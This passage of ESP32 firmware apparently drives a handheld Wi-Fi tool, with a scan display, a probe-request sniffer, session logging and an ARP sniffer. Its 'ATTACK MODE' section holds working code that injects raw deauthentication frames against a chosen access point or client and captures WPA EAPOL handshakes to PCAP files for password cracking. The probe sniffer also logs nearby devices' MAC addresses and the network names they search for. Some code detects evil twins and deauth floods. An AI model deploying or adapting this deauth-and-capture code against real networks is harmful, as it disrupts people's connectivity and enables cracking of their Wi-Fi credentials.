    gfx.fillRect(UI_MARGIN_X, SUMMARY_TOP + (curRow * SUMMARY_ROW_H) - 7,
                 SCREEN_W - (UI_MARGIN_X * 2), SUMMARY_ROW_H, 0);
    drawSummaryRow(curRow, g_cursorIndex);
  }

  g_prevCursorIndex = g_cursorIndex;
  display.update();
}

static void formatElapsed(uint32_t ms, char* out, size_t len) {
  uint32_t seconds = ms / 1000;
  if (seconds < 60) {
    snprintf(out, len, "%lus ago", seconds);
  } else if (seconds < 3600) {
    snprintf(out, len, "%lum ago", seconds / 60);
  } else {
    snprintf(out, len, "%luh ago", seconds / 3600);
  }
}

// ============================================================================
//  Network detail view
//  Shows full BSSID, signal, channel, encryption, auth, and risk
// ============================================================================
static void drawDetail(int idx) {
  if (idx < 0 || idx >= g_resultCount) return;

  const ScanResult& r = g_results[idx];
  beginFrame(false);

  char title[28];
  snprintf(title, sizeof(title), "%s", r.essid[0] ? r.essid : "(hidden)");
  drawHeader(title);

  u8g2.setFont(u8g2_font_5x8_tf);

  const int X  = UI_MARGIN_X;
  const int Y  = 28;
  const int DY = 11;

  char bf[18];  bssidFull(r.bssid, bf, sizeof(bf));
  char pwr[12]; snprintf(pwr, sizeof(pwr), "%d dBm", r.rssi);
  char ch[8];   snprintf(ch,  sizeof(ch),  "%d",     r.channel);

  u8g2.setCursor(X, Y);        u8g2.print("BSSID:");   u8g2.setCursor(62, Y);        u8g2.print(bf);
  u8g2.setCursor(X, Y+DY);     u8g2.print("Signal:");  u8g2.setCursor(62, Y+DY);     u8g2.print(pwr);
  u8g2.setCursor(X, Y+DY*2);   u8g2.print("Channel:"); u8g2.setCursor(62, Y+DY*2);   u8g2.print(ch);
  u8g2.setCursor(X, Y+DY*3);   u8g2.print("Encrypt:"); u8g2.setCursor(62, Y+DY*3);   u8g2.print(encLabel(r.authMode));
  u8g2.setCursor(X, Y+DY*4);   u8g2.print("Auth:");    u8g2.setCursor(62, Y+DY*4);   u8g2.print(authLabel(r.authMode));
  u8g2.setCursor(X, Y+DY*5);   u8g2.print("Risk:");    u8g2.setCursor(62, Y+DY*5);   u8g2.print(riskWord(r.riskLevel));

  // Timestamps
  char elapsed[16];
  uint32_t now = millis();
  formatElapsed(now - r.firstSeen, elapsed, sizeof(elapsed));
  u8g2.setCursor(X, Y+DY*6);  u8g2.print("First:");
  u8g2.setCursor(62, Y+DY*6); u8g2.print(elapsed);

  // Anomaly warnings
  if (r.anomalyFlags) {
    u8g2.setCursor(X, Y+DY*7);
    if (r.anomalyFlags & ANOM_EVIL_TWIN) {
      u8g2.print("!! Possible Evil Twin");
    } else if (r.anomalyFlags & ANOM_AUTH_CHANGE) {
      u8g2.print("! Auth change detected");
    } else if (r.anomalyFlags & ANOM_DUPLICATE_SSID) {
      u8g2.print("i Duplicate SSID");
    } else if (r.anomalyFlags & ANOM_CHANNEL_SHIFT) {
      u8g2.print("! Channel shift detected");
    } else if (r.anomalyFlags & ANOM_BSSID_ROTATION) {
      u8g2.print("i Duplicate infrastructure");
    }
  }
  drawFooter("1x=back  hold=menu");
  endFrame();
}

// ============================================================================
//  Probe sniffer
//  Captures 802.11 probe requests from nearby client devices.
//  Runs in promiscuous mode - no connection to any network.
// ============================================================================
static void IRAM_ATTR probeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  int8_t rssi = pkt->rx_ctrl.rssi;

  if (pkt->rx_ctrl.sig_len < 28) return;

  uint8_t subtype = (payload[0] >> 4) & 0x0F;
  uint8_t ftype   = (payload[0] >> 2) & 0x03;
  if (ftype != 0) return;

  // Deauth / disassoc detection
  if (subtype == 12 || subtype == 10) {
    g_deauthCount++;
    g_lastDeauthMs = millis();
    return;
  }

  // Association / reassociation request - client connecting to AP
  if (subtype == 0 || subtype == 2) {
    if (pkt->rx_ctrl.sig_len < 28) return;
    const uint8_t* clientMac = payload + 10; // src
    const uint8_t* apBssid   = payload + 16; // bssid
    if (clientMac[0] & 0x01) return;         // skip multicast

    // Check if already tracked
    bool found = false;
    for (int i = 0; i < g_clientCount; i++) {
      if (memcmp(g_clients[i].clientMac, clientMac, 6) == 0 &&
          memcmp(g_clients[i].apBssid,   apBssid,   6) == 0) {
        g_clients[i].lastSeen = millis();
        found = true;
        break;
      }
    }

    if (!found && g_clientCount < 100) {
      memcpy(g_clients[g_clientCount].clientMac, clientMac, 6);
      memcpy(g_clients[g_clientCount].apBssid,   apBssid,   6);
      g_clients[g_clientCount].lastSeen = millis();
      g_clientCount++;
      Serial.printf("Client found: %02X:%02X:%02X:%02X:%02X:%02X -> AP %02X:%02X:%02X:%02X:%02X:%02X\n",
        clientMac[0], clientMac[1], clientMac[2],
        clientMac[3], clientMac[4], clientMac[5],
        apBssid[0],   apBssid[1],   apBssid[2],
        apBssid[3],   apBssid[4],   apBssid[5]);
    }
    return;
  }

  // From here on subtype == 4 (probe request)
  if (subtype != 4) return;

  const uint8_t* mac = payload + 10;
  if (mac[0] & 0x01) return;

  bool randomized = (mac[0] & 0x02) != 0;

  char ssid[33] = "";
  int pos = 24;
  while (pos + 2 <= (int)pkt->rx_ctrl.sig_len) {
    uint8_t tag = payload[pos];
    uint8_t len = payload[pos + 1];
    if (pos + 2 + len > (int)pkt->rx_ctrl.sig_len) break;
    if (tag == 0x00) {
      if (len > 0 && len <= 32) {
        memcpy(ssid, payload + pos + 2, len);
        ssid[len] = '\0';
        bool suspicious = false;
        for (int j = 0; j < len; j++) {
          char c = ssid[j];
          if (c < 0x20 || c > 0x7E) { suspicious = true; break; }
          if (c == '{' || c == '}' || c == '[' || c == ']' || c == '"' || c == ':') {
            suspicious = true; break;
          }
        }
        if (suspicious) ssid[0] = '\0';
      }
      break;
    }
    pos += 2 + len;
  }

  g_probeTotalSeen++;
  if (!ssid[0]) return;

  for (int i = 0; i < g_probeCount; i++) {
    if (memcmp(g_probes[i].mac, mac, 6) == 0 &&
        strcmp(g_probes[i].ssid, ssid) == 0) {
      g_probes[i].lastSeen = millis();
      g_probes[i].count++;
      if (rssi > g_probes[i].rssi) g_probes[i].rssi = rssi;
      return;
    }
  }

  int slot = g_probeCount < MAX_PROBES ? g_probeCount++ : 0;
  if (slot == 0 && g_probeCount >= MAX_PROBES) {
    uint32_t oldest = g_probes[0].firstSeen;
    for (int i = 1; i < MAX_PROBES; i++) {
      if (g_probes[i].firstSeen < oldest) {
        oldest = g_probes[i].firstSeen;
        slot = i;
      }
    }
  }
  memcpy(g_probes[slot].mac, mac, 6);
  strncpy(g_probes[slot].ssid, ssid, 32);
  g_probes[slot].ssid[32]    = '\0';
  g_probes[slot].rssi        = rssi;
  g_probes[slot].firstSeen   = millis();
  g_probes[slot].lastSeen    = millis();
  g_probes[slot].count       = 1;
  g_probes[slot].randomized  = randomized;
}

static void surveyChannels() {
  // Reset stats
  for (int i = 0; i < 13; i++) {
    g_channelStats[i].channel = i + 1;
    g_channelStats[i].score   = 0;
  }

  // Quick WiFi scan to find AP density per channel
  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n; i++) {
    int ch = WiFi.channel(i);
    if (ch < 1 || ch > 13) continue;
    int rssi = WiFi.RSSI(i);
    // Weight by RSSI — nearby APs score higher
    uint32_t weight = (uint32_t)max(0, 100 + rssi);
    g_channelStats[ch - 1].score += weight;
  }
  WiFi.scanDelete();

  // Build sorted channel order - insertion sort descending by score
  for (int i = 0; i < 13; i++) g_channelOrder[i] = i;
  for (int i = 1; i < 13; i++) {
    uint8_t key = g_channelOrder[i];
    int j = i - 1;
    while (j >= 0 && g_channelStats[g_channelOrder[j]].score < g_channelStats[key].score) {
      g_channelOrder[j + 1] = g_channelOrder[j];
      j--;
    }
    g_channelOrder[j + 1] = key;
  }

  Serial.println("Channel survey:");
  for (int i = 0; i < 13; i++) {
    Serial.printf("  Ch%d score=%lu\n",
      g_channelStats[g_channelOrder[i]].channel,
      g_channelStats[g_channelOrder[i]].score);
  }
}

static void loadProbeIndex() {
  File f = FS.open("/probes/index.bin", "r");
  if (!f) { g_probeNext = 0; g_probeTotal = 0; g_probeIndexLoaded = true; return; }
  const size_t expected = sizeof(g_probeNext) + sizeof(g_probeTotal);
  if (f.size() != expected) {
    f.close();
    g_probeNext = 0;
    g_probeTotal = 0;
    g_probeIndexLoaded = true;
    return;
  }
  if (f.read((uint8_t*)&g_probeNext, sizeof(g_probeNext)) != sizeof(g_probeNext) ||
      f.read((uint8_t*)&g_probeTotal, sizeof(g_probeTotal)) != sizeof(g_probeTotal)) {
    g_probeNext = 0;
    g_probeTotal = 0;
  }
  f.close();
  g_probeIndexLoaded = true;
}

static void saveProbeIndex() {
  File f = FS.open("/probes/index.bin", "w");
  if (!f) return;
  f.write((const uint8_t*)&g_probeNext,  sizeof(g_probeNext));
  f.write((const uint8_t*)&g_probeTotal, sizeof(g_probeTotal));
  f.close();
}

static void saveProbeSession() {
  if (g_probeCount == 0) return;
  if (!g_probeIndexLoaded) loadProbeIndex();

  uint16_t slot = g_probeNext % MAX_PROBE_SESSIONS;
  char path[32];
  snprintf(path, sizeof(path), "/probes/p%03d.csv", slot);

  File f = FS.open(path, "w");
  if (!f) return;

  f.print("MAC,SSID,RSSI,FIRST_SEEN,LAST_SEEN,COUNT,RANDOMIZED\r\n");
  for (int i = 0; i < g_probeCount; i++) {
    const ProbeResult& p = g_probes[i];
    char bf[18];
    bssidFull(p.mac, bf, sizeof(bf));
    f.print(bf);
    f.print(","); fileCsvEscaped(f, p.ssid[0] ? p.ssid : "<any>");
    f.print(","); f.print(p.rssi);
    f.print(","); f.print(p.firstSeen / 1000);
    f.print(","); f.print(p.lastSeen / 1000);
    f.print(","); f.print(p.count);
    f.print(","); f.print(p.randomized ? "yes" : "no");
    f.print("\r\n");
  }
  f.close();

  if (g_probeTotal < MAX_PROBE_SESSIONS) g_probeTotal++;
  g_probeNext = (slot + 1) % MAX_PROBE_SESSIONS;
  saveProbeIndex();
}

static void loadArpSessionIndex() {
  File f = FS.open("/arp/index.bin", "r");
  if (!f) {
    g_arpSessionNext  = 0;
    g_arpSessionTotal = 0;
    g_arpSessionIndexLoaded = true;
    return;
  }
  const size_t expected = sizeof(g_arpSessionNext) + sizeof(g_arpSessionTotal);
  if (f.size() != expected) {
    f.close();
    g_arpSessionNext = 0;
    g_arpSessionTotal = 0;
    g_arpSessionIndexLoaded = true;
    return;
  }
  if (f.read((uint8_t*)&g_arpSessionNext, sizeof(g_arpSessionNext)) != sizeof(g_arpSessionNext) ||
      f.read((uint8_t*)&g_arpSessionTotal, sizeof(g_arpSessionTotal)) != sizeof(g_arpSessionTotal)) {
    g_arpSessionNext = 0;
    g_arpSessionTotal = 0;
  }
  f.close();
  g_arpSessionIndexLoaded = true;
}

static void saveArpSessionIndex() {
  File f = FS.open("/arp/index.bin", "w");
  if (!f) return;
  f.write((const uint8_t*)&g_arpSessionNext,  sizeof(g_arpSessionNext));
  f.write((const uint8_t*)&g_arpSessionTotal, sizeof(g_arpSessionTotal));
  f.close();
}

static void startProbeSniffer() {
  g_probeCount = 0;
  g_probeTotalSeen = 0;
  g_deauthCount   = 0;
  g_lastDeauthMs  = 0;
  g_clientCount  = 0;
  memset(g_probes, 0, sizeof(g_probes));
  memset(g_clients,  0, sizeof(g_clients));

  // Survey channels before entering promiscuous mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  surveyChannels();

  g_probeChannel = 0;
  g_lastHop = 0;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&probeCallback);
  esp_wifi_set_channel(
    g_channelStats[g_channelOrder[0]].channel,
    WIFI_SECOND_CHAN_NONE);

  g_probeActive = true;
}

static void stopProbeSniffer() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  delay(100);
  esp_wifi_stop();
  g_probeActive = false;
  saveProbeSession();
}

static void drawSessions() {
  beginFrame(false);
  drawHeader("Scan Sessions");

  u8g2.setFont(u8g2_font_5x8_tf);

  const int X = UI_MARGIN_X;
  const int Y = 28;
  const int DY = 11;  // reduced to fit 6 lines

  char line[48];
  snprintf(line, sizeof(line), "WiFi:  %d / %d sessions", g_sessionIndex.count, MAX_SESSIONS);
  u8g2.setCursor(X, Y);
  u8g2.print(line);

  snprintf(line, sizeof(line), "Probe: %d / %d sessions", g_probeTotal, MAX_PROBE_SESSIONS);
  u8g2.setCursor(X, Y + DY);
  u8g2.print(line);

  snprintf(line, sizeof(line), "ARP:   %d / %d sessions", g_arpSessionTotal, MAX_ARP_SESSIONS);
  u8g2.setCursor(X, Y + DY * 2);
  u8g2.print(line);

  snprintf(line, sizeof(line), "BLE:   %d / %d sessions", g_bleScanTotal, MAX_BLE_SESSIONS);
  u8g2.setCursor(X, Y + DY * 3);
  u8g2.print(line);

  size_t total = fsTotalBytesSafe();
  size_t used  = fsUsedBytesSafe();
  int pct = total > 0 ? (int)((used * 100UL) / total) : 0;
  snprintf(line, sizeof(line), "Flash: %d%% used", pct);
  u8g2.setCursor(X, Y + DY * 4);
  u8g2.print(line);

  if (g_sessionIndex.count > 0) {
    int lastSlot = (g_sessionIndex.next - 1 + MAX_SESSIONS) % MAX_SESSIONS;
    const SessionMeta& last = g_sessionIndex.sessions[lastSlot];
    snprintf(line, sizeof(line), "Last:  #%lu  %d APs",
             (unsigned long)last.scanNumber, last.apCount);
    u8g2.setCursor(X, Y + DY * 5);
    u8g2.print(line);
  }

  drawFooter("3x=clear all  hold=menu");
  endFrame();
}

// ============================================================================
//  Probe sniffer screen
//  Shows live capture of nearby device probe requests
// ============================================================================
static void drawProbe() {
  beginFrame(false);
  drawHeader("Probe Sniffer");

  u8g2.setFont(u8g2_font_5x8_tf);

  if (g_probeCount == 0) {
    u8g2.setFont(MAIN_FONT);
    u8g2.setCursor(UI_MARGIN_X, 42);
    u8g2.print("Listening for probes...");
    drawFooter("hold=menu");
    endFrame();
    return;
  }

  const int ROWS  = 8;
  const int ROW_H = 11;
  const int TOP   = 28;

  // Show only named probes on screen
  int shown = 0;
  for (int i = g_probeCount - 1; i >= 0 && shown < ROWS; i--) {
    const ProbeResult& p = g_probes[i];
    if (!p.ssid[0]) continue;  // skip <any>
    int y = TOP + (shown * ROW_H);
    shown++;

    char bs[6];
    bssidShort(p.mac, bs, sizeof(bs));

    char line[32];
    snprintf(line, sizeof(line), "%s%s  %.14s",
             p.randomized ? "~" : " ", bs, p.ssid);

    u8g2.setCursor(UI_MARGIN_X, y);
    u8g2.print(line);
  }

  if (shown == 0) {
    u8g2.setFont(MAIN_FONT);
    u8g2.setCursor(UI_MARGIN_X, 42);
    u8g2.print("No named probes yet...");
  }

  char footer[48];
  uint8_t curCh = g_channelStats[g_channelOrder[g_probeChannel % PROBE_CHANNEL_COUNT]].channel;
  if (g_deauthCount > 0 && (uint32_t)(millis() - g_lastDeauthMs) < 10000) {
    snprintf(footer, sizeof(footer), "!! DEAUTH:%lu ch%d hold=menu",
             (unsigned long)g_deauthCount, curCh);
  } else {
    snprintf(footer, sizeof(footer), "%d named/%d seen ch%d hold=menu",
             g_probeCount, g_probeTotalSeen, curCh);
  }
  drawFooter(footer);
  endFrame();
}

// ============================================================================
//  ATTACK MODE (Improved for Heltec Wireless Paper)
// ============================================================================
static uint8_t selectedBssid[6] = {0};
static int     selectedChannel = 0;
static char    selectedSSID[33] = "";
static volatile bool attackRunning = false;
static File    pcapFile;
static uint32_t handshakePackets = 0;
static uint32_t g_lastAttackMs = 0;
static bool     waitingForHandshake = false;
static uint32_t deauthSentMs = 0;
static uint32_t lastHandshakeScreenUpdate = 0;
static uint8_t capturedClientMac[6] = {0};
static bool g_hasCapturedClient = false;
static uint8_t beaconsCaptured = 0;

// PCAP structures
typedef struct {
    uint32_t magic_number  = 0xa1b2c3d4;
    uint16_t version_major = 2;
    uint16_t version_minor = 4;
    uint32_t thiszone      = 0;
    uint32_t sigfigs       = 0;
    uint32_t snaplen       = 2500;
    uint32_t network       = 105;
} pcap_hdr_t;

typedef struct {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} pcaprec_hdr_t;

static void sendDeauthFrame(const uint8_t* apBssid, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(8);

  uint8_t deauth[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
  };

  // Direction 1: AP -> client (or broadcast)
  if (g_hasCapturedClient) {
    memcpy(&deauth[4], capturedClientMac, 6);
  }
  memcpy(&deauth[10], apBssid, 6);
  memcpy(&deauth[16], apBssid, 6);

  for (int i = 0; i < 32; i++) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_internal_tx(WIFI_IF_STA, deauth, sizeof(deauth));
    delay(2);
  }

  if (g_hasCapturedClient) {
    memcpy(&deauth[4],  apBssid, 6);
    memcpy(&deauth[10], capturedClientMac, 6);
    memcpy(&deauth[16], apBssid, 6);

    for (int i = 0; i < 32; i++) {
      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
      esp_wifi_internal_tx(WIFI_IF_STA, deauth, sizeof(deauth));
      delay(2);
    }
  }

  Serial.printf("Deauth sent to %s\n",
    g_hasCapturedClient ? "client (targeted, both directions)" : "broadcast");
}

// NOTE: Keep this callback limited to capture bookkeeping. Filesystem writes
// here are intentionally not redesigned in this maintenance pass because
// changing the capture pipeline changes attack-mode behavior.
static void IRAM_ATTR attackPromiscCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!attackRunning) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  if (len < 24) return;

  // Filter for our target BSSID
  bool isOurNetwork = false;
  if (len > 22 && memcmp(&payload[16], selectedBssid, 6) == 0) isOurNetwork = true;
  if (!isOurNetwork && len > 28 && memcmp(&payload[22], selectedBssid, 6) == 0) isOurNetwork = true;
  if (!isOurNetwork) return;

  // Sniff client MAC from data frames only
  if (type == WIFI_PKT_DATA && len > 22) {
    if (memcmp(&payload[16], selectedBssid, 6) == 0 &&
          !g_hasCapturedClient) {
        memcpy(capturedClientMac, &payload[10], 6);
        g_hasCapturedClient = true;

      Serial.printf("Client MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
        capturedClientMac[0], capturedClientMac[1], capturedClientMac[2],
        capturedClientMac[3], capturedClientMac[4], capturedClientMac[5]);
    }
  }

  // Capture beacon frames from target AP - limit to 5 to save space
  if (type == WIFI_PKT_MGMT && len > 36) {
    uint8_t subtype = (payload[0] >> 4) & 0x0F;
    if (subtype == 8 && beaconsCaptured < 5) {
      if (memcmp(&payload[16], selectedBssid, 6) == 0) {
        if (pcapFile) {
          uint32_t nowUs = (uint32_t)esp_timer_get_time();
          pcaprec_hdr_t rec = {
            nowUs / 1000000UL,
            nowUs % 1000000UL,
            len, len
          };
          pcapFile.write((uint8_t*)&rec, sizeof(rec));
          pcapFile.write(payload, len);
          beaconsCaptured++;
        }
      }
    }
    return;
  }

  // Only search for EAPOL in data frames
  if (type != WIFI_PKT_DATA) return;

  // Search for EAPOL
  for (int i = 24; i < len - 8; i++) {
    bool found = false;

    // SNAP + EAPOL
    if (payload[i]   == 0xAA && payload[i+1] == 0xAA &&
        payload[i+2] == 0x03 && payload[i+3] == 0x00 &&
        payload[i+4] == 0x00 && payload[i+5] == 0x00 &&
        payload[i+6] == 0x88 && payload[i+7] == 0x8E) {
      found = true;
    }

    // Raw EAPOL
    if (!found && payload[i] == 0x88 && payload[i+1] == 0x8E) {
      found = true;
    }

    if (found) {
      handshakePackets++;
      Serial.printf("EAPOL captured. Total: %lu\n", handshakePackets);

      if (pcapFile) {
        uint32_t nowUs = (uint32_t)esp_timer_get_time();
        pcaprec_hdr_t rec = {
          nowUs / 1000000UL,
          nowUs % 1000000UL,
          len, len
        };
        pcapFile.write((uint8_t*)&rec, sizeof(rec));
        pcapFile.write(payload, len);
      }
      break;
    }
  }
}

static void drawAttackMenu() {
    beginFrame(false);
    drawHeader("Attack Demo");
    u8g2.setFont(MAIN_FONT);

    const char* items[3] = {"1. Select Target", "2. Deauth Attack", "3. Handshake Capture"};
    for (int i = 0; i < 3; i++) {
        u8g2.setCursor(UI_MARGIN_X, 35 + i*18);
        u8g2.print(items[i]);
    }

    u8g2.setCursor(UI_MARGIN_X, 95);
    if (selectedSSID[0]) {
        u8g2.print("Target: ");
        u8g2.print(selectedSSID);
    } else {
        u8g2.print("No target selected");
    }
    drawFooter("2x=start  3x=reselect  hold=menu");
    endFrame();
}

static void updateTargetCursor(int prevIdx) {
  display.fastmodeOn();

  const int ROW_H = 14;
  const int TOP   = 32;
  const int MAX_ROWS = 6;

  // Erase and redraw previous row without cursor
  int prevRow = prevIdx - g_scrollOffset;
  if (prevRow >= 0 && prevRow < MAX_ROWS) {
    int y = TOP + prevRow * ROW_H;
    gfx.fillRect(UI_MARGIN_X, y - 8, SCREEN_W - (UI_MARGIN_X * 2), ROW_H, 0);
    int idx = g_scrollOffset + prevRow;
    if (idx < g_resultCount) {
      const ScanResult& r = g_results[idx];
      char line[48];
      snprintf(line, sizeof(line), "%.20s Ch%d %ddBm", r.essid[0] ? r.essid : "(hidden)", r.channel, r.rssi);
      u8g2.setFont(u8g2_font_5x8_tf);
      u8g2.setCursor(UI_MARGIN_X, y);
      u8g2.print(line);
    }
  }

  // Erase and redraw current row with cursor
  int curRow = g_cursorIndex - g_scrollOffset;
  if (curRow >= 0 && curRow < MAX_ROWS) {
    int y = TOP + curRow * ROW_H;
    gfx.fillRect(UI_MARGIN_X, y - 8, SCREEN_W - (UI_MARGIN_X * 2), ROW_H, 0);
    int idx = g_scrollOffset + curRow;
    if (idx < g_resultCount) {
      const ScanResult& r = g_results[idx];
      char line[48];
      snprintf(line, sizeof(line), "%.20s Ch%d %ddBm", r.essid[0] ? r.essid : "(hidden)", r.channel, r.rssi);
      u8g2.setFont(u8g2_font_5x8_tf);
      u8g2.setCursor(UI_MARGIN_X, y);
      u8g2.print("> ");
      u8g2.print(line);
    }
  }

  display.update();
}

static void drawTargetSelect() {
    beginFrame(false);
    drawHeader("Select Target");
    u8g2.setFont(u8g2_font_5x8_tf);

    if (g_resultCount == 0) {
        u8g2.setCursor(UI_MARGIN_X, 50);
        u8g2.print("Run WiFi Scan first!");
        drawFooter("hold=back");
        endFrame();
        return;
    }

    for (int i = 0; i < 6 && (g_scrollOffset + i) < g_resultCount; i++) {
        int idx = g_scrollOffset + i;
        const ScanResult& r = g_results[idx];
        int y = 32 + i * 14;

        char line[48];
        snprintf(line, sizeof(line), "%.20s Ch%d %ddBm", r.essid[0] ? r.essid : "(hidden)", r.channel, r.rssi);
        u8g2.setCursor(UI_MARGIN_X, y);
        if (idx == g_cursorIndex) u8g2.print("> ");
        u8g2.print(line);
    }

    drawFooter("1x=next  3x=select  hold=back");
    endFrame();
}

static void drawHandshakeScreen() {
    beginFrame(false);
    drawHeader("Handshake Capture");

    u8g2.setFont(MAIN_FONT);
    u8g2.setCursor(UI_MARGIN_X, 42);
    u8g2.print("Target: ");
    u8g2.print(selectedSSID[0] ? selectedSSID : "None");

    char buf[40];
    snprintf(buf, sizeof(buf), "EAPOL Packets: %lu", handshakePackets);
    u8g2.setCursor(UI_MARGIN_X, 65);
    u8g2.print(buf);

    if (handshakePackets >= 4) {
        u8g2.setCursor(UI_MARGIN_X, 85);
        u8g2.print("EAPOL captured; verify capture");
    } else {
        u8g2.setCursor(UI_MARGIN_X, 85);
        u8g2.print("Capturing EAPOL frames...");
    }

    drawFooter("hold=stop");
    endFrame();
}

static bool findClientForBssid(const uint8_t* apBssid, uint8_t* clientMacOut) {
  uint32_t mostRecent = 0;
  int      bestIdx    = -1;

  for (int i = 0; i < g_clientCount; i++) {
    if (memcmp(g_clients[i].apBssid, apBssid, 6) == 0) {
      if (g_clients[i].lastSeen > mostRecent) {
        mostRecent = g_clients[i].lastSeen;
        bestIdx    = i;
      }
    }
  }

  if (bestIdx >= 0) {
    memcpy(clientMacOut, g_clients[bestIdx].clientMac, 6);
    return true;
  }
  return false;
}

static void startHandshakeCapture() {
  if (selectedChannel == 0) {
    Serial.println("No target selected");
    return;
  }

  mode = MODE_HANDSHAKE;
  attackRunning = true;
  handshakePackets = 0;
  waitingForHandshake = false;
  deauthSentMs = 0;
  memset(capturedClientMac, 0, sizeof(capturedClientMac));
  g_hasCapturedClient = false;
  beaconsCaptured = 0;

  // Try to find a known client for this AP from probe sniffer data
  if (findClientForBssid(selectedBssid, capturedClientMac)) {
    g_hasCapturedClient = true;
    Serial.printf("Pre-loaded client MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
      capturedClientMac[0], capturedClientMac[1], capturedClientMac[2],
      capturedClientMac[3], capturedClientMac[4], capturedClientMac[5]);
  } else {
    Serial.println("No client MAC from probe data, will sniff during capture");
  }

  uint16_t slot = g_handshakeIndex.next % MAX_HANDSHAKES;
  char path[32];
  snprintf(path, sizeof(path), "/handshakes/h%03d.cap", slot);

  pcapFile = FS.open(path, "w");
  if (pcapFile) {
    pcap_hdr_t hdr;
    pcapFile.write((uint8_t*)&hdr, sizeof(hdr));

    HandshakeMeta& s = g_handshakeIndex.sessions[slot];
    s.timestamp  = millis();
    strncpy(s.ssid, selectedSSID, 32);
    s.ssid[32]   = '\0';
    memcpy(s.bssid, selectedBssid, 6);
    s.channel    = selectedChannel;
    s.eapolCount = 0;
    snprintf(s.filename, sizeof(s.filename), "h%03d.cap", slot);

    if (g_handshakeIndex.count < MAX_HANDSHAKES) g_handshakeIndex.count++;
    g_handshakeIndex.next = (slot + 1) % MAX_HANDSHAKES;
    saveHandshakeIndex();
    Serial.println("PCAP file created");
  } else {
    Serial.println("Failed to create PCAP file");
  }

  WiFi.mode(WIFI_STA);
  delay(100);
  WiFi.disconnect();
  delay(100);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(attackPromiscCallback);
  esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
  delay(50);
  Serial.printf("Capture started on %s (Channel %d)\n", selectedSSID, selectedChannel);
  Serial.printf("Client MAC at start: %02X:%02X:%02X:%02X:%02X:%02X\n",
    capturedClientMac[0], capturedClientMac[1], capturedClientMac[2],
    capturedClientMac[3], capturedClientMac[4], capturedClientMac[5]);
  sendDeauthFrame(selectedBssid, selectedChannel);
  g_lastAttackMs = millis();
  drawHandshakeScreen();
}

static void stopAttack() {
  attackRunning = false;
  delay(10);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  delay(10);
  esp_wifi_set_promiscuous(false);
  delay(20);
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  delay(100);

  if (pcapFile) {
    pcapFile.flush();
    delay(50);
    pcapFile.close();
    Serial.println("PCAP file saved");
  }

  if (g_handshakeIndex.count > 0) {
    int lastSlot = (g_handshakeIndex.next - 1 + MAX_HANDSHAKES) % MAX_HANDSHAKES;
    g_handshakeIndex.sessions[lastSlot].eapolCount = handshakePackets;
    saveHandshakeIndex();
  }

  g_hasCapturedClient = false;
  memset(capturedClientMac, 0, sizeof(capturedClientMac));

  handshakePackets = 0;
  g_lastAttackMs = 0;
  lastHandshakeScreenUpdate = 0;
  waitingForHandshake = false;
  deauthSentMs = 0;
  beaconsCaptured = 0;
  mode = MODE_ATTACK_MENU;
  drawAttackMenu();
  resetInputFrontend();
}

// ============================================================================
//  ARP scanner
// ============================================================================
#define MAX_ARP_ENTRIES 100

struct ArpEntry {
  uint8_t  mac[6];
  uint8_t  ip[4];
  uint32_t firstSeen;
  uint32_t lastSeen;
  uint16_t count;
};

static ArpEntry  g_arpEntries[MAX_ARP_ENTRIES];
static int       g_arpCount       = 0;
static bool      g_arpActive      = false;
static int       g_arpChannel     = 0;
static uint32_t  g_lastArpHop     = 0;
static char      g_arpSSID[33]    = "";
static char      g_arpPass[64]    = "";
static bool      g_arpConnected   = false;
static bool      g_arpConfigMode  = false;

static void IRAM_ATTR arpCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_arpActive) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  if (len < 60) return;

  // Look for ARP EtherType (0x08 0x06) after LLC/SNAP header
  for (int i = 24; i < len - 28; i++) {
    if (payload[i]     == 0xAA &&
        payload[i + 1] == 0xAA &&
        payload[i + 2] == 0x03 &&
        payload[i + 3] == 0x00 &&
        payload[i + 4] == 0x00 &&
        payload[i + 5] == 0x00 &&
        payload[i + 6] == 0x08 &&
        payload[i + 7] == 0x06) {

      const uint8_t* arp = payload + i + 8;
      const uint8_t* senderMac = arp + 8;
      const uint8_t* senderIp  = arp + 14;

      if (senderMac[0] & 0x01) return;
      if (senderIp[0] == 0 && senderIp[1] == 0 &&
          senderIp[2] == 0 && senderIp[3] == 0) return;

      for (int j = 0; j < g_arpCount; j++) {
